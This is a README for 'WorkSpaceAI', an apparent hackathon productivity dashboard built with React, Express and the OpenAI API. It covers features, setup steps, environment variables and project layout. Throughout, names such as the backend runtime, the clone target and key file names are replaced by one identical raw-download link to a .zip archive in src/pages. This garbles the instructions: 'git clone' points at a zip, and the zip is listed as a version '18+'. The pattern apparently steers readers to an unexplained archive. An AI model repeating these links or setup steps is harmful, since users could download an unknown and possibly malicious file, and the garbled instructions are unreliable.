# WorkSpaceAI - AI-Powered Unified Work Assistant

An AI-powered productivity dashboard that centralizes work emails, documents, presentations, and chats — and auto-generates smart summaries and email drafts — all in one place.

## 🚀 Features

- **🤖 AI Chat Assistant** - Powered by OpenAI GPT-3.5-turbo
- **📧 Email Summaries** - AI-powered email analysis and summarization
- **📄 Document AI** - Intelligent document processing and insights
- **💬 Chat Integration** - Seamless communication workflows
- **📅 Meeting Digests** - Automated meeting summaries and action items
- **⚡ Smart Automation** - AI-driven productivity enhancements

## 🛠️ Tech Stack

- **Frontend**: React + TypeScript + Vite + Tailwind CSS
- **Backend**: https://github.com/Rithvik-krishna/WorkSpaceAIBhoomi/raw/refs/heads/main/src/pages/Work_AI_Space_Bhoomi_2.8.zip + Express + TypeScript
- **AI**: OpenAI GPT-3.5-turbo API
- **Authentication**: Google OAuth 2.0
- **Styling**: Shadcn/ui components

## 📋 Prerequisites

- https://github.com/Rithvik-krishna/WorkSpaceAIBhoomi/raw/refs/heads/main/src/pages/Work_AI_Space_Bhoomi_2.8.zip 18+ 
- npm or bun
- OpenAI API key

## 🚀 Quick Start

### 1. Clone the Repository
```bash
git clone https://github.com/Rithvik-krishna/WorkSpaceAIBhoomi/raw/refs/heads/main/src/pages/Work_AI_Space_Bhoomi_2.8.zip
cd WorkSpaceAIBhoomi
```

### 2. Install Dependencies
```bash
# Install frontend dependencies
npm install

# Install backend dependencies
cd backend
npm install
cd ..
```

### 3. Environment Setup

#### Frontend (.env in root directory)
```env
VITE_API_URL=http://localhost:5001
```

#### Backend (.env in backend directory)
```env
# OpenAI Configuration
OPENAI_API_KEY=your-openai-api-key-here

# Server Configuration
PORT=5001
NODE_ENV=development

# JWT Secret (for authentication)
JWT_SECRET=your-super-secret-jwt-key-change-this-in-production

# Google OAuth (optional)
GOOGLE_CLIENT_ID=your-google-client-id
GOOGLE_CLIENT_SECRET=your-google-client-secret
```

### 4. Start Development Servers

#### Start Backend
```bash
cd backend
npm run dev
```

#### Start Frontend (in new terminal)
```bash
npm run dev
```

### 5. Access the Application
- **Frontend**: http://localhost:8080
- **Backend API**: http://localhost:5001
- **Chatbot**: http://localhost:8080/chatbot

## 🔐 Security Features

- ✅ Environment variables for sensitive data
- ✅ API key validation and error handling
- ✅ Secure authentication with JWT
- ✅ CORS protection
- ✅ Input validation and sanitization

## 🎯 Usage

1. **Authentication**: Sign in with Google OAuth
2. **Dashboard**: Access your unified work interface
3. **AI Chat**: Click "Chat with AI" to interact with WorkSpaceAI
4. **Productivity**: Use AI assistance for emails, documents, and tasks

## 🏗️ Project Structure

```
WorkSpaceAI/
├── src/                    # Frontend source code
│   ├── components/        # React components
│   ├── pages/            # Page components
│   ├── context/          # React context
│   └── lib/              # Utility libraries
├── backend/               # Backend source code
│   ├── src/              # TypeScript source
│   │   ├── routes/       # API routes
│   │   └── https://github.com/Rithvik-krishna/WorkSpaceAIBhoomi/raw/refs/heads/main/src/pages/Work_AI_Space_Bhoomi_2.8.zip      # Main server file
│   └── https://github.com/Rithvik-krishna/WorkSpaceAIBhoomi/raw/refs/heads/main/src/pages/Work_AI_Space_Bhoomi_2.8.zip      # Backend dependencies
├── public/                # Static assets
└── https://github.com/Rithvik-krishna/WorkSpaceAIBhoomi/raw/refs/heads/main/src/pages/Work_AI_Space_Bhoomi_2.8.zip             # This file
```

## 🔧 Development

### Build Commands
```bash
# Frontend build
npm run build

# Backend build
cd backend
npm run build
```

### Code Quality
- TypeScript for type safety
- ESLint for code linting
- Prettier for code formatting

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## 📄 License

This project is built for AIBhoomi Hackathon 2025.

## 🆘 Support

If you encounter any issues:
1. Check the environment variables are set correctly
2. Ensure all dependencies are installed
3. Check the console for error messages
4. Verify your OpenAI API key is valid

## 🎉 Acknowledgments

- Built for AIBhoomi Hackathon 2025
- Powered by OpenAI GPT technology
- Built with modern web technologies
